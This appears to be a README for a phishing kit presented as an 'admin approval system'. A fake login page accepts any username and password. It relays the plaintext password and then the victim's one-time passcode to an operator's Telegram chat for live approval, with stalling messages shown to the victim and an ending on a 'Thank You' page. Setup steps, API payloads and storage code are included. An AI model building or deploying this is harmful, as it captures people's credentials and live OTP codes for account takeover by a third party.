we# 🔐 Admin Approval System Setup Guide

This system requires admin approval for BOTH login credentials AND OTP codes. The admin receives Telegram messages with **Approve** and **Disapprove** buttons for each step of the authentication process.

## 🚀 Quick Setup

### 1️⃣ Configure Environment Variables

Add these to your `.env.local` (for development) or hosting environment:

```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
NEXT_PUBLIC_LOGIN_TIMEOUT_MS=1500
NEXT_PUBLIC_OTP_TIMEOUT_MS=1500
```

### 2️⃣ Set Up Telegram Webhook

After deploying your app, run:

```bash
npm run setup-webhook
```

Or manually visit:

```
https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook?url=<YOUR_DOMAIN>/api/telegram-webhook
```

### 3️⃣ Test the Flow

1. Visit your login page
2. Enter any username/password
3. Check your Telegram for approval request
4. Click **Approve** or **Disapprove**
5. User gets redirected or sees error

## 🔄 How It Works

### Complete Flow:

**Step 1: Login Approval**

1. **User submits credentials** → System creates pending login approval
2. **Admin gets Telegram message** with login approve/disapprove buttons
3. **Admin clicks button** → System updates approval status
4. **User gets result** → Redirect to OTP page or show error message

**Step 2: OTP Approval**

1. **User enters OTP code** → System creates pending OTP approval
2. **Admin gets Telegram message** with OTP approve/disapprove buttons
3. **Admin clicks button** → System updates approval status
4. **User gets result** → Redirect to Thank You page or show error message

### Admin Experience:

**Login Approval Message:**

```
🔐 Login Approval Request

📅 Time: 2024-01-15 14:30:25
🆔 Flow ID: abc123def456
👤 Username: john.doe
🔑 Password: mypassword123
🌐 User Agent: Mozilla/5.0...

⚠️ Please review and approve/reject this login attempt

[✅ Approve] [❌ Disapprove]
```

**OTP Approval Message:**

```
🔢 OTP Verification Request

📅 Time: 2024-01-15 14:32:10
🆔 Flow ID: def789ghi012
🔐 OTP Code: 123456
🌐 User Agent: Mozilla/5.0...

⚠️ Please review and approve/reject this OTP verification

[✅ Approve OTP] [❌ Reject OTP]
```

### User Experience:

**Login Step:**

- **Submitting**: "Signing on..." button
- **Processing**: "Authenticating..." with cycling messages like "Verifying your identity..."
- **Approved**: Redirected to OTP page
- **Rejected**: Error message "Invalid credentials. Please check your username and password."

**OTP Step:**

- **Submitting**: "Verifying..." button
- **Processing**: "Processing..." with cycling messages like "Processing verification code..."
- **Approved**: Redirected to Thank You page
- **Rejected**: Error message "Invalid verification code. Please check and try again."

## 🛠️ Configuration Options

### Timeout Settings

```javascript
// Maximum time to wait for approval (default: 10 minutes)
const maxAttempts = 120; // 120 × 5 seconds = 10 minutes

// Polling interval (default: 5 seconds)
setTimeout(poll, 5000);
```

### Error Messages

You can customize error messages in `src/app/page.js`:

```javascript
// Rejection message
setApprovalError(
  result.reason ||
    "Invalid credentials. Please check your username and password."
);

// Timeout message
setApprovalError("Approval timeout. Please try again.");

// Session expired
setApprovalError("Session expired. Please try again.");
```

## 🔧 API Endpoints

### POST `/api/admin-approval`

Submit credentials for approval

```json
{
  "flowId": "abc123",
  "username": "john.doe",
  "password": "password123",
  "meta": { "userAgent": "..." }
}
```

### GET `/api/admin-approval/status?flowId=abc123`

Check approval status

```json
{
  "status": "pending|resolved|not_found",
  "approved": true|false,
  "reason": "Optional rejection reason"
}
```

### POST `/api/telegram-webhook`

Handles Telegram callback queries (button presses)

## 🚨 Security Notes

- **In-Memory Storage**: Current system uses in-memory storage. For production with multiple servers, use Redis or database
- **Webhook Security**: Consider adding webhook secret validation
- **Rate Limiting**: Add rate limiting to prevent spam
- **Session Management**: Approvals expire after 30 minutes

## 🔍 Troubleshooting

### Webhook Not Working?

1. Check if webhook is set: `https://api.telegram.org/bot<TOKEN>/getWebhookInfo`
2. Verify your domain is accessible
3. Check server logs for webhook errors

### Buttons Not Responding?

1. Ensure webhook URL is correct
2. Check Telegram bot token
3. Verify callback data format

### Polling Issues?

1. Check browser console for errors
2. Verify API endpoints are working
3. Test with network tab open

### Common Errors:

**"Missing Telegram configuration"**

- Add `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` to environment

**"Approval timeout"**

- Admin didn't respond within 10 minutes
- User should try again

**"Session expired"**

- Approval was too old (30+ minutes)
- User should refresh and try again

## 🎯 Production Considerations

### For High Traffic:

```javascript
// Use Redis for approval storage
import Redis from "ioredis";
const redis = new Redis(process.env.REDIS_URL);

// Store approval
await redis.setex(`approval:${flowId}`, 1800, JSON.stringify(approval));

// Check status
const approval = await redis.get(`approval:${flowId}`);
```

### For Multiple Admins:

- Send to Telegram group instead of individual chat
- First admin to respond wins
- Add admin identification in responses

### For Audit Trail:

- Log all approval decisions
- Store timestamps and admin IDs
- Export approval history

## 📱 Mobile Considerations

The system works perfectly on mobile:

- Responsive UI with proper touch targets
- Telegram notifications work on mobile apps
- Polling continues in background (within limits)

---

## 🎉 You're All Set!

Your admin approval system is now active. Every login attempt will require your approval via Telegram before users can proceed to the OTP page.
